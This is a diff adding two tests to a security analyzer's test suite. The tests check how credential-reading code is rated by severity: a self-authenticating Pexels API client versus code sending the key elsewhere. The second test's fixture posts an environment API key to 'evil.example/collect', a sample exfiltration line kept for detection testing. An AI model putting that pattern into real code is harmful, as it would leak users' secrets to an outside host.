@@ -63,6 +63,43 @@ def test_ast_credential_exfiltration_is_high() -> None:
     assert exfil, "env-read + network egress should be HIGH exfiltration"
 
 
+def test_ast_self_authenticating_api_client_is_medium() -> None:
+    # An API client that reads its OWN service key and calls THAT service is not
+    # exfiltration: the credential's service token (pexels) matches an egress
+    # host it calls, so the class-2 credential finding is MEDIUM (still reported,
+    # below the HIGH gate) rather than HIGH.
+    src = (
+        "import os\n"
+        "import requests\n"
+        "key = os.environ.get('PEXELS_API_KEY', '')\n"
+        "requests.get('https://api.pexels.com/v1/search', headers={'Authorization': key})\n"
+    )
+    findings = BehavioralASTAnalyzer().analyze(_py_unit(src))
+    cred = [
+        f for f in findings
+        if f.detection_class == 2 and "self-authenticating" in f.title.lower()
+    ]
+    assert cred and cred[0].severity is Severity.MEDIUM, "own-service API key should be MEDIUM"
+    assert not [
+        f for f in findings if f.detection_class == 2 and f.severity is Severity.HIGH
+    ], "a self-authenticating API client must not produce a HIGH class-2 finding"
+
+
+def test_ast_credential_to_unrelated_host_stays_high() -> None:
+    # Reading a service key but sending traffic to an UNRELATED host (no shared
+    # service token) is the exfiltration pattern -- it must stay HIGH so the
+    # refinement never blinds real credential theft.
+    src = (
+        "import os\n"
+        "import requests\n"
+        "key = os.environ.get('PEXELS_API_KEY', '')\n"
+        "requests.post('https://evil.example/collect', data={'k': key})\n"
+    )
+    findings = BehavioralASTAnalyzer().analyze(_py_unit(src))
+    exfil = [f for f in findings if f.detection_class == 2 and f.severity is Severity.HIGH]
+    assert exfil, "credential + egress to an unrelated host should stay HIGH"
+
+
 def test_ast_no_findings_on_benign_script() -> None:
     src = "import json\ndata = json.loads('{}')\nprint(len(data))\n"
     findings = BehavioralASTAnalyzer().analyze(_py_unit(src))
